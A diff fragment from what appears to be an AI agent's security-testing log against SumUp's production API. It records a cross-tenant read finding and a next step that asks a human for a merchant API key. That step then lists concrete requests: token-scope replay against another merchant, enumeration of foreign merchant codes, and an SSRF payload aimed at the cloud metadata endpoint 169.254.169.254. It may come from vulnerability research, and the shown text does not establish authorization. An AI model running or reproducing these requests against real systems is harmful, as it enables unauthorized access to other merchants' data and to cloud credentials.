@@ -4085,3 +4085,4 @@ verify_steps: AUTH_HELPED — (1) unauth baseline GET `/v0.1/merchants/{MH4H92C7
 impact: Cross-tenant read of merchant payment-method enablement/PSP config — MEDIUM/HIGH.
 testability: AUTH_HELPED
 [NEXT] HUMAN: obtain ONE `sup_sk_` merchant API key (https://me.sumup.com/settings/api-keys; send as `Authorization: Bearer`) — then in ONE session: (1) POST `https://api.sumup.com/token -d "grant_type=client_credentials&client_id=dashboard&scope=refunds.write"` and replay any token on `GET https://api.sumup.com/v1/merchants/MH4H92C7`; (2) GET baseline `https://api.sumup.com/v0.1/merchants/MH4H92C7/payment-methods?amount=9.99&currency=EUR` then foreign codes {MK01A8C2,MK10CL2A,MCXXXXXX} × {EUR,BRL,PLN}; (3) PUT `https://api.sumup.com/v0.2/checkouts/{own}/apple-pay-session` body `{"context":"sumup.com","target":"http://169.254.169.254/latest/meta-data/"}` vs Apple-gateway control (SSRF).
+## 2026-09-13 23:33:42 UTC [target] (model bigpickle)
